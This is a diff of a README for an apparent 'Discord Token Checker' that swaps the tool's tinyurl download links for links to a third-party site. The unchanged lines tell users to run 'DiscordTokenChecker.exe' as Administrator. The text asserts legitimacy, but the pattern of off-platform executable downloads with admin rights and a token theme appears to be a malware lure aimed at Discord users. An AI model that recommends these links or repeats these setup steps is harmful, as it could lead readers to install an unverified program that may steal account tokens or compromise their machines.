@@ -9,7 +9,7 @@ The **✅ Discord Token Checker** is a legitimate utility for Discord bot develo
 
 <div align="center">
 
-[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/discord-token-checker-free)
+[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/discord-token-checker-free)
 
 </div>
 
@@ -85,7 +85,7 @@ Bot developers need to test tokens. Self-hosted bot users need to verify token v
 3. **🖱️ Run as Administrator** — `DiscordTokenChecker.exe`
 4. **🚀 Launch Token Checker**
 
-[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/discord-token-checker-free)
+[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/discord-token-checker-free)
 
 ### Main Interface
 
@@ -255,7 +255,7 @@ Fast token validation for Discord developers. **Discord Token Checker** helps yo
 
 <div align="center">
 
-[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/discord-token-checker-free)
+[![Download Discord Token Checker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/discord-token-checker-free)
 
 **Version 3.1.0** — Token validation & management. Free forever.
 
